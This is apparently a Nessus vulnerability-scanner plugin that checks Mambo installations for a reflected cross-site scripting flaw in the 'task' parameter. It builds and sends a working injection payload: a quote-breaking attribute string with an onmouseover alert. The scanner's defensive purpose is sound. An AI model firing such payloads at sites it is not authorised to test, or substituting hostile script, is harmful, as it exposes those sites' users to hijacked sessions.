#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(55511);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_bugtraq_id(48455);

  script_name(english:"Mambo task Parameter XSS");
  script_summary(english:"Tries to inject script code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is susceptible to a
cross-site scripting attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Mambo installed on the remote host does not sanitize
input to the 'task' parameter of 'index.php' when 'option' is set to
'com_content' before using it to generate dynamic HTML.

An attacker could leverage this issue to inject arbitrary HTML or script
code into a user's browser to be executed within the security context of
the affected site.

Note that this install is likely to be affected by several similar
issues affecting its administrative pages, although Nessus has not
checked for them."
  );
  # http://yehg.net/lab/pr0js/advisories/%5Bmambo4.6.x%5D_cross_site_scripting
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f09fc11a");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2011/Jun/512");
  # http://mambo-developer.org/tracker/index.php?do=details&task_id=479&project=3&order=dateopened&sort=desc
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?661499ec");
  script_set_attribute(attribute:"see_also", value:"http://forum.mambo-foundation.org/showthread.php?t=18481");
  script_set_attribute(attribute:"solution", value:"Apply the patch referenced in Mambo Tracker issue #479.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/10/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/10/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/07/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP", "www/mambo_mos");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


install = get_install_from_kb(appname:"mambo_mos", port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Try to exploit the issue.
id = rand() % 10;
itemid = 32;
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'-]=/;:";

alert = 'alert(/' + SCRIPT_NAME + '/)';
exploit = '" style=width:1000px;height:1000px;top:0;left:0;position:absolute onmouseover=' + alert + ' ns="';
esc_exploit = str_replace(find:'"', replace:'\\"', string:exploit);

vuln = test_cgi_xss(
  port     : port,
  cgi      : '/index.php',
  dirs     : make_list(dir),
  qs       : 'option=com_content&' +
             'task='+urlencode(str:exploit, unreserved:unreserved) + '&' +
             'id=' + id + '&' +
             'Itemid=' + itemid,
  pass_str : esc_exploit+'&amp;id='+id+'&amp;Itemid='+itemid+'&amp;limit=10',
  pass2_re : 'align="center">Results 1 - '
);
if (!vuln) exit(0, "The Mambo install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
